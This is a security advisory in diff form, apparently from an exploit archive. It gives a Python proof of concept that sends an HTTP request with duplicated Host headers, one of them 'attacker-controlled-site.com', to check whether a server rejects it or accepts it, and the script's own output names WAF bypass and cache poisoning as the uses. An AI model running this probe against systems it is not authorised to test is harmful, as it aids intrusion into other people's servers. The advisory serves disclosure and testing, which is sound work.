@@ -1,0 +1,88 @@
+=============================================================================================================================================
+| # Title     : HTTP Host Header Duplication Parsing Behavior Analysis                                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://redhat.com/                                                                                                         |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214558/ & CVE-2025-14523
+
+[+] Summary    : This PoC evaluates how an HTTP server or underlying HTTP parsing library handles duplicated Host headers within a single HTTP/1.1 request. 
+                  According to RFC 7230, requests containing multiple Host headers are considered invalid and should be rejected.
+   
+[+] The test sends a crafted request containing two conflicting Host headers to observe whether the target system:
+
+Correctly rejects the request with a 400 Bad Request response (secure behavior), or
+
+Accepts the request and processes one of the conflicting Host values (non‑compliant behavior).
+
+Improper handling of duplicated Host headers may indicate parsing inconsistencies between components such as reverse proxies, application servers, or security devices 
+(e.g., WAFs). Such inconsistencies can potentially lead to security issues including request smuggling, cache poisoning, or access control bypasses when combined with other conditions.
+
+
+[+] POC : python poc.py
+
+
+import socket
+
+target_host = "192.168.1.100"  
+target_port = 80
+
+
+payload = (
+    "GET / HTTP/1.1\r\n"
+    "Host: safe-internal-site.com\r\n"
+    "Host: attacker-controlled-site.com\r\n"
+    "User-Agent: Security-Audit-PoC\r\n"
+    "Accept: */*\r\n"
+    "Connection: close\r\n"
+    "\r\n"
+)
+
+def run_exploit():
+    s = None
+    try:
+        print(f"[*] Sending malicious payload to {target_host}:{target_port}...")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((target_host, target_port))
+        s.sendall(payload.encode("ascii", errors="ignore"))
+
+        response = b""
+        while True:
+            chunk = s.recv(4096)
+            if not chunk:
+                break
+            response += chunk
+
+        full_res = response.decode(errors="ignore")
+
+        print("\n[] Response Analysis:")
+        print("-" * 30)
+
+        if "400 Bad Request" in full_res:
+            print("[] STATUS: SECURE")
+            print("[+] The server rejected the duplicated Host headers as per RFC compliance.")
+
+        elif "attacker-controlled-site.com" in full_res or "attacker" in full_res.lower():
+            print("[] STATUS: VULNERABLE")
+            print("[!] Exploitation Successful: The server adopted the LAST Host header (Last-Value Wins).")
+            print("[!] This discrepancy can be used to bypass WAFs or perform Cache Poisoning.")
+
+        else:
+            print("[️] STATUS: INCONCLUSIVE")
+            print("[?] The server accepted the request but the behavior doesn't clearly show which Host was used.")
+
+    except Exception as e:
+        print(f"[] Connection Failed: {e}")
+
+    finally:
+        if s:
+            s.close()
+
+if __name__ == "__main__":
+    run_exploit()
+		
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
